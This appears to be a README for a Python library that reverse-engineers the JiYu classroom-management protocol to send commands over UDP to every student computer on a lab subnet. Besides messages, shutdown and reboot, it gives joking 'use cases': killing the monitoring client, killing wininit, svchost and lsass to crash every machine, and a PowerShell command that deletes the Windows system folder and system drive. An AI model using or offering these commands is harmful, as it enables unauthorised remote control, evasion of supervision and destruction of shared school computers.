# JiYuClient Protocol

抓包制作的
极域学生端协议库 [测试中]  
可以通过极域的协议 极域 UDP/IP 来控制极域学生端
目前由于没有环境测试, 所以不能保证 100% 可用

## 用法

clone 项目，导入 JiyuProtocol

    import ipaddress
    from jiyu_ptl import JiyuProtocol

    # 建议保存网段以方便后续调用: 
    ip4n = ipaddress.ip_network("192.168.0.0/24”) # 广播网段, 请将

### 执行命令

    JiyuProtocol.send_content("msg %USERNAME% Hello World", is_cmd=True, ip_network=ip4n) #弹窗 Hello World, 在 192.168.0.0/24 的所有学生端

### 极域消息

    JiyuProtocol.send_content("Hello World", ip_network=ip4n) # 极域消息 Hello World, 在 192.168.0.0/24 的所有学生端

### 关机重启

    JiyuProtocol.send_shutdown(ip_network=ip4n) # 关机
    JiyuProtocol.send_shutdown(is_reboot=True,ip_network=ip4n) # 重启

### 指定 IP Addresses

#### 示例1

    ip_addrs = []
    ip_addrs.append(ipaddress.ip_address("192.168.0.15")) # 目标 IP
    JiyuProtocol.send_content("msg %USERNAME% Hello World", is_cmd=True, ip_addresses=ip_addrs)

#### 示例2

    JiyuProtocol.send_content("msg %USERNAME% Hello World", is_cmd=True, ip_addresses=('192.168.0.15', ))

### 用例

#### 帮助全班同学解除控制(

    JiyuProtocol.send_content("taskkill -f -im StudentMain.exe", is_cmd=True, ip_network=ipaddress.ip_network("192.168.0.0/24")) # 将 '192.168.0.0/24' 换成机房的网段

#### 帮助全班电脑蓝屏(

    # 有一定可能会被杀毒软件拦截
    # 干掉 系统初始化 (Win10+ 有可能无效)
    JiyuProtocol.send_content("taskkill -f -im wininit.exe", is_cmd=True, ip_network=ipaddress.ip_network("192.168.0.0/24")) # 将 '192.168.0.0/24' 换成机房的网段
    # 干掉 系统服务
    JiyuProtocol.send_content("taskkill -f -im svchost.exe", is_cmd=True, ip_network=ipaddress.ip_network("192.168.0.0/24")) # 将 '192.168.0.0/24' 换成机房的网段
    # 干掉 本地安全权限服务 (负责部分 HANDLE 处理, 干掉之后无法结束进程, 关机重启或取消关机重启等)
    JiyuProtocol.send_content("taskkill -f -im lsass.exe", is_cmd=True, ip_network=ipaddress.ip_network("192.168.0.0/24")) # 将 '192.168.0.0/24' 换成机房的网段

#### 帮助全班删系统(

    JiyuProtocol.send_content('powershell -c "Remove-Item -Force $Env:SystemRoot"; powershell -c "Remove-Item -Force $Env:SystemDrive"', is_cmd=True, ip_network=ipaddress.ip_network("192.168.0.0/24")) # 将 '192.168.0.0/24' 换成机房的网段
